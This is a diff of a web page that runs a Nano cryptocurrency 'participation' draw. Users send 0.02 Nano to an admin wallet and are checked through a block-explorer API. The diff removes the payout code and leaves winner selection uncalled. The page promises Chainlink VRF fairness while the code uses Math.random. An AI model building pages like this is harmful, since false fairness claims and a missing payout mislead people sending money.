@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nano Lottery System with Virtual File System</title>
+    <meta name="google-site-verification" content="Jm_b25LAotqgoIKi-tTBrsktZn9w05p3R_z9POHE0Ic" />
+    <title>Nano Participation System</title>
     <style>
         .emoji {
             font-size: 50px;
@@ -20,32 +21,53 @@
             max-height: 200px;
             overflow-y: scroll;
         }
+        .project-details {
+            margin: 20px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
     </style>
 </head>
 <body>
 
     <!-- Big Laughing Emoji and Message -->
     <div class="emoji">😂</div>
-    <h1 class="center-text">We will give a reward to see this emoji for one person out of 100 nd spending time on our site!</h1>
+    <h1 class="center-text">We will give a reward for seeing this emoji to one person out of 100 and spending time on our site!</h1>
     
-    <!-- Recommendation for Crypto Faucets -->
-    <p class="center-text"><strong>We recommend users to get contributions from crypto faucets.and send nano manually and everything is done manually .this is demo project still in development and there is no guarantee for nano </strong></p>
+    <!-- Disclaimer Message -->
+    <p class="center-text">
+        We recommend users to get contributions from crypto faucets and send Nano manually. 
+        Everything is done manually. This is a demo project still in development and there is no guarantee for Nano.
+    </p>
 
-    <!-- User Wallet Connection -->
+    <!-- Project Details and Guide -->
+    <div class="project-details">
+        <h3>Project Overview</h3>
+        <p>This project is a demonstration of how participants can join a decentralized system using Nano cryptocurrency. The process is as follows:</p>
+        <ul>
+            <li>Enter your Nano wallet address in the form below.</li>
+            <li>Send <strong>0.02 Nano</strong> to the admin wallet manually within 10 minutes.</li>
+            <li>The system will check the transaction using Nano’s block explorer.</li>
+            <li>If your transaction is valid, you will be added to the participants' list.</li>
+            <li>Once 100 participants are collected, a random participant will be selected using Chainlink VRF for fairness.</li>
+        </ul>
+        <p>Please note: This is a <strong>demo project</strong>, and we highly recommend using contributions from crypto faucets to avoid potential loss of funds. There is no guarantee of Nano payouts as the project is still under development.</p>
+    </div>
+
+    <!-- User Wallet Input -->
     <form id="walletForm" class="center-text">
         <label for="walletAddress">Enter your Nano wallet address:</label>
         <input type="text" id="walletAddress" name="walletAddress" required>
-        <button type="submit">Connect</button>
+        <button type="submit">Submit</button>
     </form>
 
-    <p id="userStatus" class="center-text">Please enter your wallet address to join the lottery.</p>
+    <p id="userStatus" class="center-text">Please enter your wallet address to join.</p>
 
     <!-- Admin Wallet -->
     <p class="center-text">Admin Wallet Address: <strong>nano_3m1pir3qb3ciyxsupsmo3zf1t3f1yccx8pjokj97tk9ya4oq333h69utzu4f</strong></p>
 
-    <!-- Lottery Info -->
-    <button id="joinLottery" disabled>Join Lottery for 0.02 Nano</button>
-    <p id="lotteryStatus" class="center-text">Participants: 0/100</p>
+    <!-- Participant Status -->
+    <p id="participantStatus" class="center-text">Participants: 0/100</p>
 
     <!-- Logs -->
     <h3 class="center-text">Participant Log</h3>
@@ -57,68 +79,77 @@
     <script>
         // Global Variables
         const adminWallet = 'nano_3m1pir3qb3ciyxsupsmo3zf1t3f1yccx8pjokj97tk9ya4oq333h69utzu4f';
-        const entryFee = 0.02;  // The fee to join the lottery
+        const entryFee = 0.02;  // The fee to join the participation
+        const nanoBlockExplorerAPI = 'https://api.nanode.co/v1/account/'; // Use Nanode for fetching transaction data
+
         let participants = [];
         let winners = [];
         let userWallet = '';
-
-        // In-memory storage for virtual file system
         let participantsFile = [];
         let winnersFile = [];
 
-        // Handle User Wallet Connection
-        document.getElementById('walletForm').addEventListener('submit', function(event) {
+        // Handle User Wallet Entry
+        document.getElementById('walletForm').addEventListener('submit', async function(event) {
             event.preventDefault();
             userWallet = document.getElementById('walletAddress').value;
-            document.getElementById('userStatus').textContent = `Connected with wallet: ${userWallet}`;
-            document.getElementById('joinLottery').disabled = false;
-        });
 
-        // Join Lottery
-        document.getElementById('joinLottery').addEventListener('click', async function() {
-            if (participants.length < 100) {
-                // Simulating sending 0.02 Nano to Admin Wallet
-                await sendNano(userWallet, adminWallet, entryFee);
+            // Check if user sent 0.02 Nano to admin wallet in the last 10 minutes
+            const isEligible = await checkTransaction(userWallet, adminWallet, entryFee);
 
-                // Log participant wallet to virtual file
-                participants.push(userWallet);
-                participantsFile.push(`Wallet: ${userWallet}`);
-                updateLog(participantsFile, "log");
-                document.getElementById('lotteryStatus').textContent = `Participants: ${participants.length}/100`;
-
-                // Once we hit 100 participants, start selecting a winner
-                if (participants.length === 100) {
-                    document.getElementById('lotteryStatus').textContent = 'Selecting winner...';
-
-                    // Generate a random number using Chainlink VRF
-                    generateRandomWinner(participants);
-                }
+            if (isEligible) {
+                addParticipant(userWallet);
+                document.getElementById('userStatus').textContent = `Added to participants: ${userWallet}`;
+            } else {
+                document.getElementById('userStatus').textContent = 'No valid transaction found. Please send 0.02 Nano.';
             }
         });
+
+        // Check if there is a valid transaction between user wallet and admin wallet
+        async function checkTransaction(userWallet, adminWallet, amount) {
+            try {
+                // Fetch transaction history for the user's wallet
+                const response = await fetch(`${nanoBlockExplorerAPI}${userWallet}`);
+                const data = await response.json();
+
+                // Filter transactions that were sent to the admin wallet within the last 10 minutes
+                const tenMinutesAgo = Date.now() - (10 * 60 * 1000); // 10 minutes in milliseconds
+
+                const validTransaction = data.history.find(tx => {
+                    const txAmount = parseFloat(tx.amount) / 1e30; // Convert from RAW to Nano
+                    const txTime = new Date(tx.timestamp * 1000).getTime();
+                    return tx.account === adminWallet && txAmount === amount && txTime >= tenMinutesAgo;
+                });
+
+                return !!validTransaction;
+            } catch (error) {
+                console.error('Error fetching transaction data:', error);
+                return false;
+            }
+        }
+
+        // Add the user wallet to the participants list
+        function addParticipant(wallet) {
+            participants.push(wallet);
+            participantsFile.push(`Participant: ${wallet}`);
+            updateLog(participantsFile, "log");
+
+            document.getElementById('participantStatus').textContent = `Participants: ${participants.length}/100`;
+        }
 
         // Function to handle Chainlink VRF and select winner
         async function generateRandomWinner(participants) {
             try {
-                // Simulate Chainlink VRF
                 const randomIndex = await requestChainlinkVRF(participants.length);
-
-                // Select the winner
                 const winner = participants[randomIndex];
-                document.getElementById('lotteryStatus').textContent = `Winner selected: ${winner}`;
+                document.getElementById('participantStatus').textContent = `Winner selected: ${winner}`;
 
-                // Log winner to a separate virtual file
                 winners.push(winner);
                 winnersFile.push(`Winner: ${winner}`);
                 updateLog(winnersFile, "winnersLog");
 
-                // Transfer funds to winner from admin wallet (simulated)
-                transferToWinner(winner, adminWallet);
-
-                // Clear the participants file for the next round
                 participants = [];
                 participantsFile = [];
-                updateLog(participantsFile, "log"); // Clear the log box
-
+                updateLog(participantsFile, "log");
             } catch (error) {
                 console.error('Error in selecting a winner:', error);
                 alert('Failed to select a winner.');
@@ -128,23 +159,6 @@
         // Simulate Chainlink VRF to get a secure random number
         async function requestChainlinkVRF(maxParticipants) {
             return Math.floor(Math.random() * maxParticipants); // Placeholder for real VRF result
-        }
-
-        // Function to simulate sending Nano from User Wallet to Admin Wallet
-        async function sendNano(fromWallet, toWallet, amount) {
-            // Simulate transaction delay
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    console.log(`Sent ${amount} Nano from ${fromWallet} to ${toWallet}`);
-                    resolve();
-                }, 1000);
-            });
-        }
-
-        // Function to simulate transfer of funds to the winner
-        async function transferToWinner(winnerWallet, adminWallet) {
-            console.log(`Transferring funds from ${adminWallet} to winner ${winnerWallet}`);
-            alert(`Winner ${winnerWallet} will receive all collected Nano!`);
         }
 
         // Update log box with participant or winner entries
